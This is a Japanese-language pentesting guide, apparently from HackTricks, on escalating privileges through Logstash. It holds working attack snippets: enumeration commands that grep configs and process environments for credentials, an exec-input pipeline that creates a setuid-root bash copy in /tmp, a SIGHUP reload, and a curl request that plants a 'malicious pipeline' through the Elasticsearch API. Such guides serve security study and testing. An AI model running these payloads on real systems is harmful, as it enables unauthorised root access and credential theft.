# Logstash 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash は、**パイプライン** と呼ばれるシステムを通じて **ログの収集、変換、送信** に使用されます。これらのパイプラインは、**input**、**filter**、**output** の各ステージで構成されます。Logstash が侵害されたマシン上で動作している場合、興味深い点が生じます。

### パイプライン設定

パイプラインは **/etc/logstash/pipelines.yml** ファイルで設定されます。このファイルには、パイプライン設定の場所が記載されています。
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルから、pipeline configurationsを含む **.conf** ファイルの場所が分かります。**Elasticsearch output module** を使用する場合、**pipelines** に **Elasticsearch credentials** が含まれることは一般的です。これは、Logstash が Elasticsearch にデータを書き込む必要があるため、広範な権限を持っていることが多くあります。設定パス内のワイルドカードにより、Logstash は指定されたディレクトリ内で一致するすべての pipeline を実行できます。

Logstash を `pipelines.yml` ではなく `-f <directory>` で起動すると、そのディレクトリ内の**すべてのファイル**が辞書順に連結され、単一の config として解析されます。これには、攻撃者にとって2つの意味があります。

- `000-input.conf` や `zzz-output.conf` のように配置したファイルによって、最終的な pipeline の組み立て方を変更できる
- 不正な形式のファイルによって pipeline 全体の読み込みが失敗する可能性があるため、auto-reload に依存する前に payloads を慎重に検証する

### Compromised Host 上での高速な Enumeration

Logstash がインストールされている box では、以下をすばやく確認します：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
また、ローカル監視 API に接続できるかどうかも確認します。デフォルトでは **127.0.0.1:9600** にバインドされており、通常は host に侵入した後であれば十分です:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
通常、pipeline ID、runtime の詳細、そして変更した pipeline が読み込まれたことの確認情報が得られます。

Logstash から復元した credentials により、一般的に **Elasticsearch** にアクセスできるようになるため、[Elasticsearch に関するこちらのページ](../../network-services-pentesting/9200-pentesting-elasticsearch.md)を確認してください。

### Writable Pipelines 経由の Privilege Escalation

Privilege escalation を試みるには、まず Logstash service が実行されている user を特定します。通常は **logstash** user です。次の条件の**いずれか 1 つ**を満たしていることを確認してください。

- pipeline の **.conf** file に対する **write access** を持っている、または
- **/etc/logstash/pipelines.yml** file が wildcard を使用しており、対象 folder に write access がある

さらに、次の条件の**いずれか 1 つ**を満たす必要があります。

- Logstash service を restart できる、または
- **/etc/logstash/logstash.yml** file で **config.reload.automatic: true** が設定されている

configuration に wildcard がある場合、この wildcard に一致する file を作成することで command execution が可能になります。例:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、**interval** は実行頻度を秒単位で指定します。上記の例では、**whoami** コマンドが 120 秒ごとに実行され、その出力が **/tmp/output.log** にリダイレクトされます。

**/etc/logstash/logstash.yml** で **config.reload.automatic: true** を設定すると、Logstash は再起動なしで、新規または変更された pipeline 設定を自動的に検出して適用します。ワイルドカードがない場合でも既存の設定を変更できますが、動作に支障が生じないよう注意が必要です。

### より信頼性の高い Pipeline Payload

`exec` input plugin は現在のリリースでも引き続き動作し、`interval` または `schedule` のいずれかが必要です。これは Logstash JVM を **fork** して実行するため、メモリに余裕がない場合、payload は暗黙に実行されるのではなく、`ENOMEM` で失敗する可能性があります。

より実用的な privilege-escalation payload は通常、永続的な artifact を残すものです：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
再起動権限がなくてもプロセスにシグナルを送信できる場合、Logstash は Unix系システムで **SIGHUP** によるリロードもサポートしています:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
すべての plugin が reload-friendly とは限らない点に注意してください。たとえば、**stdin** input は automatic reload を妨げるため、`config.reload.automatic` が常に変更を反映すると想定しないでください。

### Logstash から Secrets を盗む

code execution だけに注目する前に、Logstash がすでにアクセスできる data を収集します：

- Plaintext credentials は、`elasticsearch {}` outputs、`http_poller`、JDBC inputs、または cloud 関連の settings 内に hardcode されていることがよくあります
- Secure settings は **`/etc/logstash/logstash.keystore`** または別の `path.settings` directory に保存されている場合があります
- keystore password は **`LOGSTASH_KEYSTORE_PASS`** を通じて提供されることが多く、package-based install では通常 **`/etc/sysconfig/logstash`** から source されます
- `${VAR}` による environment-variable expansion は Logstash startup 時に解決されるため、service environment の確認には価値があります

Useful checks：
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
これは、**CVE-2023-46672** により、特定の状況下で Logstash がログに機密情報を記録する可能性が示されたため、確認する価値もあります。post-exploitation のホストでは、現在の設定が keystore を参照しており、secret を inline で保存していない場合でも、古い Logstash ログや `journald` エントリから credentials が漏えいする可能性があります。

### Centralized Pipeline Management Abuse

環境によっては、ホストがローカルの `.conf` ファイルにまったく依存していない場合があります。**`xpack.management.enabled: true`** が設定されていると、Logstash は Elasticsearch/Kibana から centrally managed pipelines を取得できます。このモードを有効にした後は、ローカルの pipeline config が source of truth ではなくなります。

つまり、別の attack path が存在します。

1. ローカルの Logstash settings、keystore、またはログから Elastic credentials を復元する
2. アカウントが **`manage_logstash_pipelines`** cluster privilege を持っているか確認する
3. centrally managed pipeline を作成または置き換え、次の poll interval で Logstash host に payload を実行させる

この機能で使用される Elasticsearch API は次のとおりです。
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
これは、ローカルファイルが読み取り専用であり、Logstash がすでにリモートから pipeline を取得するよう登録されている場合に特に有用です。

## 参考資料

- [Elastic Docs: Config ファイルの再読み込み](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: 集中管理された Pipeline の構成](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
